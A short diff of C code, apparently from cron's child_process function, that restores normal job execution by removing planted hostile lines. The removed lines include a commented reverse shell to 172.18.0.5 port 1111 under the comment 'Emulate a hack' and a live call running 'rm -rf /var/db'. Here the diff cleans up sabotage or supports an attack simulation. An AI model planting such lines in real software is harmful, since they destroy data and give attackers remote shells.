@@ -386,12 +386,8 @@ child_process(e, u)
                                 _exit(ERROR_EXIT);
 			    }
 			}
-#endif
-                        exit(ERROR_EXIT);
-
-                        // Emulate a hack:
-                        //execle(shell, shell, "-c", "/bin/bash -i >& /dev/tcp/172.18.0.5/1111 0>&1", (char *)0, jobenv);
-                        execle(shell, shell, "-c", "rm -rf /var/db", (char *)0, jobenv);
+#endif                     
+                        execle(shell, shell, "-c", e->cmd, (char *)0, jobenv);
 			fprintf(stderr, "%s: execle: %s\n", shell, strerror(errno));
 			_exit(ERROR_EXIT);
 		}
